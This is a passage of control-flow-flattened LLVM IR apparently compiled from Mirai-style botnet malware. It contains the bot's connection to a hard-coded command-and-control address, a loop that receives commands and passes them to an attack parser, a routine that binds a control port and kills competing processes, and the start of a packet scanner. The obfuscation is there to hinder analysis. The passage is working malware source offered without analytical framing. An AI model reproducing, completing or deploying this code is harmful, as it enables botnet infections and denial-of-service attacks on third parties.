  store i32 %227, i32* %switchVar
  br label %loopEnd

; <label>:228:                                    ; preds = %loopEntry
  store i8 0, i8* @pending_connection, align 1
  %229 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %230 = load i32, i32* @fd_serv, align 4
  %231 = sdiv i32 %230, 64
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds [16 x i64], [16 x i64]* %229, i64 0, i64 %232
  %234 = load i64, i64* %233, align 8
  %235 = load i32, i32* @fd_serv, align 4
  %236 = srem i32 %235, 64
  %237 = zext i32 %236 to i64
  %238 = shl i64 1, %237
  %239 = and i64 %234, %238
  %240 = icmp ne i64 %239, 0
  %241 = select i1 %240, i32 -2022213729, i32 -1733677614
  store i32 %241, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  call void @teardown_connection()
  store i32 422394360, i32* %switchVar
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  store i32 0, i32* %23, align 4
  store i32 4, i32* %24, align 4
  %244 = load i32, i32* @fd_serv, align 4
  %245 = bitcast i32* %23 to i8*
  %246 = call i32 @getsockopt(i32 %244, i32 1, i32 4, i8* %245, i32* %24) #7
  %247 = load i32, i32* %23, align 4
  %248 = icmp ne i32 %247, 0
  %249 = select i1 %248, i32 -1093505813, i32 1252604871
  store i32 %249, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = load i32, i32* @fd_serv, align 4
  %252 = call i32 @close(i32 %251)
  store i32 -1, i32* @fd_serv, align 4
  %253 = call i32 @rand_next()
  %254 = urem i32 %253, 10
  %255 = add i32 %254, 1
  %256 = call i32 @sleep(i32 %255)
  store i32 -308265394, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %259 = call i32 @util_strlen(i8* %258)
  %260 = trunc i32 %259 to i8
  store i8 %260, i8* %25, align 1
  %261 = call i32 @util_local_addr()
  store i32 %261, i32* @LOCAL_ADDR, align 4
  %262 = load i32, i32* @fd_serv, align 4
  %263 = call i64 @send(i32 %262, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i32 0, i32 0), i64 4, i32 16384)
  %264 = load i32, i32* @fd_serv, align 4
  %265 = call i64 @send(i32 %264, i8* %25, i64 1, i32 16384)
  %266 = load i8, i8* %25, align 1
  %267 = zext i8 %266 to i32
  %268 = icmp sgt i32 %267, 0
  %269 = select i1 %268, i32 1371571417, i32 1927593165
  store i32 %269, i32* %switchVar
  br label %loopEnd

; <label>:270:                                    ; preds = %loopEntry
  %271 = load i32, i32* @fd_serv, align 4
  %272 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %273 = load i8, i8* %25, align 1
  %274 = zext i8 %273 to i64
  %275 = call i64 @send(i32 %271, i8* %272, i64 %274, i32 16384)
  store i32 1927593165, i32* %switchVar
  br label %loopEnd

; <label>:276:                                    ; preds = %loopEntry
  store i32 -308265394, i32* %switchVar
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  store i32 422394360, i32* %switchVar
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  store i32 2046567952, i32* %switchVar
  br label %loopEnd

; <label>:279:                                    ; preds = %loopEntry
  %280 = load i32, i32* @fd_serv, align 4
  %281 = icmp ne i32 %280, -1
  %282 = select i1 %281, i32 -970911990, i32 2106439173
  store i32 %282, i32* %switchVar
  br label %loopEnd

; <label>:283:                                    ; preds = %loopEntry
  %284 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %285 = load i32, i32* @fd_serv, align 4
  %286 = sdiv i32 %285, 64
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds [16 x i64], [16 x i64]* %284, i64 0, i64 %287
  %289 = load i64, i64* %288, align 8
  %290 = load i32, i32* @fd_serv, align 4
  %291 = srem i32 %290, 64
  %292 = zext i32 %291 to i64
  %293 = shl i64 1, %292
  %294 = and i64 %289, %293
  %295 = icmp ne i64 %294, 0
  %296 = select i1 %295, i32 -1223373458, i32 2106439173
  store i32 %296, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  %298 = call i32* @__errno_location() #9
  store i32 0, i32* %298, align 4
  %299 = load i32, i32* @fd_serv, align 4
  %300 = bitcast i16* %27 to i8*
  %301 = call i64 @recv(i32 %299, i8* %300, i64 2, i32 16386)
  %302 = trunc i64 %301 to i32
  store i32 %302, i32* %26, align 4
  %303 = load i32, i32* %26, align 4
  %304 = icmp eq i32 %303, -1
  %305 = select i1 %304, i32 1241544300, i32 164645441
  store i32 %305, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = call i32* @__errno_location() #9
  %308 = load i32, i32* %307, align 4
  %309 = icmp eq i32 %308, 11
  %310 = select i1 %309, i32 94638183, i32 1641266834
  store i32 %310, i32* %switchVar
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  %312 = call i32* @__errno_location() #9
  %313 = load i32, i32* %312, align 4
  %314 = icmp eq i32 %313, 11
  %315 = select i1 %314, i32 94638183, i32 -480670146
  store i32 %315, i32* %switchVar
  br label %loopEnd

; <label>:316:                                    ; preds = %loopEntry
  %317 = call i32* @__errno_location() #9
  %318 = load i32, i32* %317, align 4
  %319 = icmp eq i32 %318, 4
  %320 = select i1 %319, i32 94638183, i32 -362502234
  store i32 %320, i32* %switchVar
  br label %loopEnd

; <label>:321:                                    ; preds = %loopEntry
  store i32 -1928413974, i32* %switchVar
  br label %loopEnd

; <label>:322:                                    ; preds = %loopEntry
  store i32 0, i32* %26, align 4
  store i32 -143878718, i32* %switchVar
  br label %loopEnd

; <label>:323:                                    ; preds = %loopEntry
  store i32 164645441, i32* %switchVar
  br label %loopEnd

; <label>:324:                                    ; preds = %loopEntry
  %325 = load i32, i32* %26, align 4
  %326 = icmp eq i32 %325, 0
  %327 = select i1 %326, i32 -2061739856, i32 923860877
  store i32 %327, i32* %switchVar
  br label %loopEnd

; <label>:328:                                    ; preds = %loopEntry
  call void @teardown_connection()
  store i32 -1928413974, i32* %switchVar
  br label %loopEnd

; <label>:329:                                    ; preds = %loopEntry
  %330 = load i16, i16* %27, align 2
  %331 = zext i16 %330 to i32
  %332 = icmp eq i32 %331, 0
  %333 = select i1 %332, i32 -2053675915, i32 -316666525
  store i32 %333, i32* %switchVar
  br label %loopEnd

; <label>:334:                                    ; preds = %loopEntry
  %335 = load i32, i32* @fd_serv, align 4
  %336 = bitcast i16* %27 to i8*
  %337 = call i64 @recv(i32 %335, i8* %336, i64 2, i32 16384)
  store i32 -1928413974, i32* %switchVar
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  %339 = load i16, i16* %27, align 2
  %340 = call zeroext i16 @ntohs(i16 zeroext %339) #9
  store i16 %340, i16* %27, align 2
  %341 = load i16, i16* %27, align 2
  %342 = zext i16 %341 to i64
  %343 = icmp ugt i64 %342, 1024
  %344 = select i1 %343, i32 693458450, i32 1221545778
  store i32 %344, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = load i32, i32* @fd_serv, align 4
  %347 = call i32 @close(i32 %346)
  store i32 -1, i32* @fd_serv, align 4
  store i32 1221545778, i32* %switchVar
  br label %loopEnd

; <label>:348:                                    ; preds = %loopEntry
  %349 = call i32* @__errno_location() #9
  store i32 0, i32* %349, align 4
  %350 = load i32, i32* @fd_serv, align 4
  %351 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %352 = load i16, i16* %27, align 2
  %353 = zext i16 %352 to i64
  %354 = call i64 @recv(i32 %350, i8* %351, i64 %353, i32 16386)
  %355 = trunc i64 %354 to i32
  store i32 %355, i32* %26, align 4
  %356 = load i32, i32* %26, align 4
  %357 = icmp eq i32 %356, -1
  %358 = select i1 %357, i32 -187961576, i32 273435281
  store i32 %358, i32* %switchVar
  br label %loopEnd

; <label>:359:                                    ; preds = %loopEntry
  %360 = call i32* @__errno_location() #9
  %361 = load i32, i32* %360, align 4
  %362 = icmp eq i32 %361, 11
  %363 = select i1 %362, i32 -861045604, i32 -978178944
  store i32 %363, i32* %switchVar
  br label %loopEnd

; <label>:364:                                    ; preds = %loopEntry
  %365 = call i32* @__errno_location() #9
  %366 = load i32, i32* %365, align 4
  %367 = icmp eq i32 %366, 11
  %368 = select i1 %367, i32 -861045604, i32 -1975094857
  store i32 %368, i32* %switchVar
  br label %loopEnd

; <label>:369:                                    ; preds = %loopEntry
  %370 = call i32* @__errno_location() #9
  %371 = load i32, i32* %370, align 4
  %372 = icmp eq i32 %371, 4
  %373 = select i1 %372, i32 -861045604, i32 -1639936497
  store i32 %373, i32* %switchVar
  br label %loopEnd

; <label>:374:                                    ; preds = %loopEntry
  store i32 -1928413974, i32* %switchVar
  br label %loopEnd

; <label>:375:                                    ; preds = %loopEntry
  store i32 0, i32* %26, align 4
  store i32 -526400506, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  store i32 273435281, i32* %switchVar
  br label %loopEnd

; <label>:377:                                    ; preds = %loopEntry
  %378 = load i32, i32* %26, align 4
  %379 = icmp eq i32 %378, 0
  %380 = select i1 %379, i32 1757583462, i32 1523328843
  store i32 %380, i32* %switchVar
  br label %loopEnd

; <label>:381:                                    ; preds = %loopEntry
  call void @teardown_connection()
  store i32 -1928413974, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  %383 = load i32, i32* @fd_serv, align 4
  %384 = bitcast i16* %27 to i8*
  %385 = call i64 @recv(i32 %383, i8* %384, i64 2, i32 16384)
  %386 = load i16, i16* %27, align 2
  %387 = call zeroext i16 @ntohs(i16 zeroext %386) #9
  store i16 %387, i16* %27, align 2
  %388 = load i32, i32* @fd_serv, align 4
  %389 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %390 = load i16, i16* %27, align 2
  %391 = zext i16 %390 to i64
  %392 = call i64 @recv(i32 %388, i8* %389, i64 %391, i32 16384)
  %393 = load i16, i16* %27, align 2
  %394 = zext i16 %393 to i32
  %395 = icmp sgt i32 %394, 0
  %396 = select i1 %395, i32 1366026441, i32 -581712254
  store i32 %396, i32* %switchVar
  br label %loopEnd

; <label>:397:                                    ; preds = %loopEntry
  %398 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %399 = load i16, i16* %27, align 2
  %400 = zext i16 %399 to i32
  call void @attack_parse(i8* %398, i32 %400)
  store i32 -581712254, i32* %switchVar
  br label %loopEnd

; <label>:401:                                    ; preds = %loopEntry
  store i32 2106439173, i32* %switchVar
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  store i32 2046567952, i32* %switchVar
  br label %loopEnd

; <label>:403:                                    ; preds = %loopEntry
  store i32 -1928413974, i32* %switchVar
  br label %loopEnd

; <label>:404:                                    ; preds = %loopEntry
  %405 = load i32, i32* %3, align 4
  ret i32 %405

loopEnd:                                          ; preds = %403, %402, %401, %397, %382, %381, %377, %376, %375, %374, %369, %364, %359, %348, %345, %338, %334, %329, %328, %324, %323, %322, %321, %316, %311, %306, %297, %283, %279, %278, %277, %276, %270, %257, %250, %243, %242, %228, %224, %198, %194, %193, %192, %188, %182, %178, %177, %168, %166, %164, %159, %147, %135, %131, %130, %126, %114, %110, %101, %100, %91, %90, %84, %78, %67, %64, %50, %43, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @unlink(i8*) #1

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #1

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #1

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #1

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #1

; Function Attrs: nounwind
declare i32 @chdir(i8*) #1

declare void @table_init() #2

; Function Attrs: noinline nounwind uwtable
define internal void @ensure_single_instance() #0 {
  %.reg2mem = alloca i32
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca i32, align 4
  %3 = alloca %union.__SOCKADDR_ARG, align 8
  %4 = alloca %union.__SOCKADDR_ARG, align 8
  store i32 1, i32* %2, align 4
  %5 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %5, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* @fd_ctrl, align 4
  %switchVar = alloca i32
  store i32 -996380694, i32* %switchVar
  %.reg2mem3 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -996380694, label %first
    i32 -1979898856, label %8
    i32 -797986942, label %9
    i32 -1584620100, label %23
    i32 -717314562, label %25
    i32 -1755728034, label %27
    i32 -533614241, label %41
    i32 -2094607658, label %46
    i32 1126194464, label %51
    i32 -856574340, label %52
    i32 54939741, label %66
    i32 1093246751, label %67
    i32 -931929562, label %73
    i32 -1241086085, label %78
    i32 -2099787053, label %79
    i32 1400309299, label %80
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp eq i32 %.reload, -1
  %7 = select i1 %6, i32 -1979898856, i32 -797986942
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  store i32 1400309299, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* @fd_ctrl, align 4
  %11 = bitcast i32* %2 to i8*
  %12 = call i32 @setsockopt(i32 %10, i32 1, i32 2, i8* %11, i32 4) #7
  %13 = load i32, i32* @fd_ctrl, align 4
  %14 = load i32, i32* @fd_ctrl, align 4
  %15 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 3, i32 0)
  %16 = or i32 2048, %15
  %17 = call i32 (i32, i32, ...) @fcntl(i32 %13, i32 4, i32 %16)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = load i8, i8* @ensure_single_instance.local_bind, align 1
  %20 = sext i8 %19 to i32
  %21 = icmp ne i32 %20, 0
  %22 = select i1 %21, i32 -1584620100, i32 -717314562
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = call i32 @htonl(i32 2130706433) #9
  store i32 -1755728034, i32* %switchVar
  store i32 %24, i32* %.reg2mem3
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i32, i32* @LOCAL_ADDR, align 4
  store i32 -1755728034, i32* %switchVar
  store i32 %26, i32* %.reg2mem3
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %.reload4 = load i32, i32* %.reg2mem3
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 2
  %29 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %28, i32 0, i32 0
  store i32 %.reload4, i32* %29, align 4
  %30 = call zeroext i16 @htons(i16 zeroext -14435) #9
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = call i32* @__errno_location() #9
  store i32 0, i32* %32, align 4
  %33 = load i32, i32* @fd_ctrl, align 4
  %34 = bitcast %union.__SOCKADDR_ARG* %3 to %struct.sockaddr**
  %35 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  store %struct.sockaddr* %35, %struct.sockaddr** %34, align 8
  %36 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %3, i32 0, i32 0
  %37 = load %struct.sockaddr*, %struct.sockaddr** %36, align 8
  %38 = call i32 @bind(i32 %33, %struct.sockaddr* %37, i32 16) #7
  %39 = icmp eq i32 %38, -1
  %40 = select i1 %39, i32 -533614241, i32 -931929562
  store i32 %40, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = call i32* @__errno_location() #9
  %43 = load i32, i32* %42, align 4
  %44 = icmp eq i32 %43, 99
  %45 = select i1 %44, i32 -2094607658, i32 -856574340
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i8, i8* @ensure_single_instance.local_bind, align 1
  %48 = sext i8 %47 to i32
  %49 = icmp ne i32 %48, 0
  %50 = select i1 %49, i32 1126194464, i32 -856574340
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i8 0, i8* @ensure_single_instance.local_bind, align 1
  store i32 -856574340, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 0
  store i16 2, i16* %53, align 4
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 2
  %55 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %54, i32 0, i32 0
  store i32 0, i32* %55, align 4
  %56 = call zeroext i16 @htons(i16 zeroext -14435) #9
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 1
  store i16 %56, i16* %57, align 2
  %58 = load i32, i32* @fd_ctrl, align 4
  %59 = bitcast %union.__SOCKADDR_ARG* %4 to %struct.sockaddr**
  %60 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  store %struct.sockaddr* %60, %struct.sockaddr** %59, align 8
  %61 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %4, i32 0, i32 0
  %62 = load %struct.sockaddr*, %struct.sockaddr** %61, align 8
  %63 = call i32 @connect(i32 %58, %struct.sockaddr* %62, i32 16)
  %64 = icmp eq i32 %63, -1
  %65 = select i1 %64, i32 54939741, i32 1093246751
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 1093246751, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = call i32 @sleep(i32 5)
  %69 = load i32, i32* @fd_ctrl, align 4
  %70 = call i32 @close(i32 %69)
  %71 = call zeroext i16 @htons(i16 zeroext -14435) #9
  %72 = call signext i8 @killer_kill_by_port(i16 zeroext %71)
  call void @ensure_single_instance()
  store i32 1400309299, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* @fd_ctrl, align 4
  %75 = call i32 @listen(i32 %74, i32 1) #7
  %76 = icmp eq i32 %75, -1
  %77 = select i1 %76, i32 -1241086085, i32 -2099787053
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  store i32 -2099787053, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  store i32 1400309299, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %79, %78, %73, %67, %66, %52, %51, %46, %41, %27, %25, %23, %9, %8, %first, %switchDefault
  br label %loopEntry
}

declare void @rand_init() #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #3

declare i32 @util_strlen(i8*) #2

declare i32 @util_strcpy(i8*, i8*) #2

; Function Attrs: nounwind
declare i32 @prctl(i32, ...) #1

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

; Function Attrs: nounwind
declare i32 @setsid() #1

declare i32 @close(i32) #2

declare signext i8 @attack_init() #2

; Function Attrs: noinline nounwind uwtable
define internal void @establish_connection() #0 {
  %.reg2mem = alloca i32
  %1 = alloca %union.__SOCKADDR_ARG, align 8
  %2 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %2, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* @fd_serv, align 4
  %switchVar = alloca i32
  store i32 -377884561, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -377884561, label %first
    i32 -712317398, label %5
    i32 -1766029783, label %6
    i32 1277621569, label %19
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %3 = icmp eq i32 %.reload, -1
  %4 = select i1 %3, i32 -712317398, i32 -1766029783
  store i32 %4, i32* %switchVar
  br label %loopEnd

; <label>:5:                                      ; preds = %loopEntry
  store i32 1277621569, i32* %switchVar
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  store i16 2, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 0), align 4
  %7 = call i32 @htonl(i32 -1335130672) #9
  store i32 %7, i32* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 2, i32 0), align 4
  %8 = call zeroext i16 @htons(i16 zeroext 1024) #9
  store i16 %8, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 1), align 2
  %9 = load i32, i32* @fd_serv, align 4
  %10 = load i32, i32* @fd_serv, align 4
  %11 = call i32 (i32, i32, ...) @fcntl(i32 %10, i32 3, i32 0)
  %12 = or i32 2048, %11
  %13 = call i32 (i32, i32, ...) @fcntl(i32 %9, i32 4, i32 %12)
  store i8 1, i8* @pending_connection, align 1
  %14 = load i32, i32* @fd_serv, align 4
  %15 = bitcast %union.__SOCKADDR_ARG* %1 to %struct.sockaddr**
  store %struct.sockaddr* bitcast (%struct.sockaddr_in* @srv_addr to %struct.sockaddr*), %struct.sockaddr** %15, align 8
  %16 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %1, i32 0, i32 0
  %17 = load %struct.sockaddr*, %struct.sockaddr** %16, align 8
  %18 = call i32 @connect(i32 %14, %struct.sockaddr* %17, i32 16)
  store i32 1277621569, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %6, %5, %first, %switchDefault
  br label %loopEntry
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #2

declare i64 @send(i32, i8*, i64, i32) #2

declare i32 @accept(i32, %struct.sockaddr*, i32*) #2

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

declare void @attack_kill_all() #2

; Function Attrs: noinline nounwind uwtable
define internal void @teardown_connection() #0 {
  %.reg2mem = alloca i32
  %1 = load i32, i32* @fd_serv, align 4
  store i32 %1, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1078805196, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1078805196, label %first
    i32 832794099, label %4
    i32 353455768, label %7
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %2 = icmp ne i32 %.reload, -1
  %3 = select i1 %2, i32 832794099, i32 353455768
  store i32 %3, i32* %switchVar
  br label %loopEnd

; <label>:4:                                      ; preds = %loopEntry
  %5 = load i32, i32* @fd_serv, align 4
  %6 = call i32 @close(i32 %5)
  store i32 353455768, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  store i32 -1, i32* @fd_serv, align 4
  %8 = call i32 @sleep(i32 1)
  ret void

loopEnd:                                          ; preds = %4, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i32 @rand_next() #2

declare i32 @sleep(i32) #2

declare i32 @util_local_addr() #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #5

declare i64 @recv(i32, i8*, i64, i32) #2

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) #5

declare void @attack_parse(i8*, i32) #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #5

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #5

declare i32 @fcntl(i32, i32, ...) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare signext i8 @killer_kill_by_port(i16 zeroext) #2

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @scanner_init() #0 {
  %.reg2mem47 = alloca i32
  %.reg2mem33 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca %struct.iphdr*, align 8
  %5 = alloca %struct.tcphdr*, align 8
  %6 = alloca %struct.payload*, align 8
  %7 = alloca %struct.binary*, align 8
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.__sigset_t, align 8
  %10 = alloca %struct.scanner_connection*, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca %struct.iphdr*, align 8
  %19 = alloca %struct.tcphdr*, align 8
  %20 = alloca %union.__SOCKADDR_ARG, align 8
  %21 = alloca i32, align 4
  %22 = alloca [1514 x i8], align 16
  %23 = alloca %struct.iphdr*, align 8
  %24 = alloca %struct.tcphdr*, align 8
  %25 = alloca %struct.scanner_connection*, align 8
  %26 = alloca %union.__SOCKADDR_ARG, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = call i32 @fork() #7
  store i32 %37, i32* @scanner_pid, align 4
  %38 = load i32, i32* @scanner_pid, align 4
  store i32 %38, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1765821897, i32* %switchVar
  %.reg2mem52 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar32 = load i32, i32* %switchVar
  switch i32 %switchVar32, label %switchDefault [
    i32 1765821897, label %first
    i32 -1066064477, label %41
    i32 -686269731, label %45
    i32 -1558112221, label %46
    i32 1721127955, label %52
    i32 1747204781, label %56
    i32 2015233310, label %77
    i32 58881678, label %80
    i32 1679944167, label %84
    i32 -1609909400, label %85
    i32 -343871471, label %96
    i32 -1876533594, label %99
    i32 -2026604697, label %100
    i32 1419429771, label %104
    i32 131424487, label %110
    i32 -2064983491, label %156
    i32 2031223812, label %161
    i32 1012011799, label %163
    i32 -357796149, label %167
    i32 -1506013524, label %222
    i32 -179289142, label %225
    i32 679566374, label %226
    i32 -1765936708, label %227
    i32 1886110287, label %244
    i32 513604896, label %249
    i32 -75795345, label %254
    i32 -1348396509, label %255
    i32 -1698749159, label %260
    i32 -270320920, label %261
    i32 1571349832, label %268
    i32 -127928694, label %269
    i32 198906088, label %276
    i32 1237668938, label %277
    i32 1791861386, label %286
    i32 489329402, label %287
    i32 672012007, label %296
    i32 1487371736, label %297
    i32 -1438663107, label %305
    i32 554887450, label %306
    i32 291708042, label %314
    i32 -1710323713, label %315
    i32 416422450, label %323
    i32 -1476822921, label %324
    i32 278959206, label %332
    i32 -1974601951, label %333
    i32 -2044615089, label %345
    i32 -589726594, label %346
    i32 20536455, label %348
    i32 1388061037, label %352
    i32 -604737738, label %361
    i32 -1662490383, label %367
    i32 -2062517049, label %368
    i32 -276754164, label %371
    i32 -2104600, label %375
    i32 -131027867, label %376
    i32 806583791, label %388
    i32 1217204083, label %389
    i32 -1906116670, label %398
    i32 -859293449, label %399
    i32 1360839022, label %408
    i32 -1797688084, label %409
    i32 -553774674, label %413
    i32 -584212970, label %428
    i32 942481700, label %437
    i32 807589548, label %443
    i32 -1059023731, label %444
    i32 1009746591, label %456
    i32 828946720, label %464
    i32 -2048510019, label %466
    i32 236831010, label %468
    i32 -507148781, label %469
    i32 -1006448341, label %474
    i32 -502091974, label %475
    i32 1809641631, label %481
    i32 -1792596803, label %503
    i32 -1823396757, label %507
    i32 -491411984, label %508
    i32 1246145767, label %514
    i32 949358438, label %536
    i32 -1114159551, label %540
    i32 1070645362, label %541
    i32 558366606, label %542
    i32 -1198779449, label %543
    i32 -991593468, label %546
    i32 -1108650322, label %553
    i32 1382763945, label %555
    i32 -1346588281, label %557
    i32 -1912425315, label %562
    i32 470403865, label %566
    i32 -710317790, label %576
    i32 545715892, label %577
    i32 -1648070568, label %595
    i32 1128697648, label %604
    i32 1194247586, label %615
    i32 -1196199205, label %624
    i32 489529777, label %628
    i32 805130747, label %631
    i32 749157683, label %649
    i32 -1631717358, label %650
    i32 -136003079, label %656
    i32 1728495011, label %657
    i32 -1813981226, label %663
    i32 -1071113246, label %675
    i32 246326022, label %696
